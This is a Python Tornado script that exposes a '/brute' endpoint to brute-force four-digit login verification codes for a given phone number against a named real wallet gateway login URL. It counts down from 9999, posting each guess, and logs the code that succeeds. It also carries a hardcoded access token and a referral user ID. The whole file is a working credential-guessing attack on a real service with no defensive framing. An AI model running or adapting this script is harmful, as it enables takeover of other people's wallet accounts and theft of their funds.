#!/usr/bin/env python
# coding=utf-8
from tornado.httpclient import AsyncHTTPClient
# from tornado.httputil import HTTPHeaders
from tornado import gen
from tornado.web import asynchronous, RequestHandler
import time
import json as JSON
import urllib
import logging
# from pymongo import MongoClient
# from pymongo.errors import BulkWriteError
import tornado
import yaml
import logging.config
import datetime
from tornado.web import Application

logging.config.dictConfig(yaml.load(open('logging.yml', 'r')))

target_url = 'https://walletgateway.gxb.io/customer/login'

class GuessPwd(RequestHandler):
    def initialize(self):
        self.log = logging.getLogger('guess')
        self.code = 9999

    @asynchronous
    @gen.coroutine
    def get(self):
        token = self.get_argument('token')
        self.phone = self.get_argument('phone', '')
        if not self.phone:
            self.write('no phone')
        if token != 'GGzEap9dYeecqH':
            self.write('unauthorized')
            return
        start = time.time()
        # self.db.User.remove({})
        self.guess()
        self.write('done')
        self.log.info('using time: %s' % (time.time()-start))

    @asynchronous
    @gen.coroutine
    def guess(self):
        self.log.info('guess code=%d' % self.code)
        now = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        http_client = AsyncHTTPClient()
        body = JSON.dumps({
            'mobile': self.phone,
            'code': '%04d' % self.code,
            "nationCode": "86",
            'referUser': "TSODYOM8VlbKp7C0q0P003380"
        })
        headers = {'Content-Type': 'application/json; charset=UTF-8'}
        # body = urllib.urlencode(body)
        # self.log.info(body)
        rsp = yield http_client.fetch(target_url, self.handle_request, method='POST', body=body, headers=headers)
        # self.log.info(rsp.body)
        # if rsp.code == 200:
        #     # self.log.info(rsp.body)
        #     result = JSON.loads(rsp.body)
        #     if result.get('message') != 'customer.error.login.code':
        #         self.log.info('correct_code=%s' % code)
        #     elif code > 1:
        #         self.log.info('guess fail')
        #         self.log.info(rsp.body)
                # self.guess(code - 1)
        # else:
        #     self.log.info('rsp code=%s' % rsp.code)
           
    @asynchronous
    @gen.coroutine 
    def handle_request(self, rsp):
        if rsp.error:
            result = JSON.loads(rsp.body)
            self.log.info(result)
            if result.get('message') == 'customer.error.login.code':
                self.log.info('error code')
                if self.code > 1:
                    self.code -= 1
                    yield self.guess()
            else:
                self.log.info('maybe %s' % self.code)
        else:
            self.log.info(rsp.body)
            self.log.info('correct code')
        self.finish()

def main():
    app = Application([
        (r"/brute", GuessPwd), 
    ])
    app.listen(7792)
    tornado.ioloop.IOLoop.instance().start()

if __name__ == "__main__":
    main()
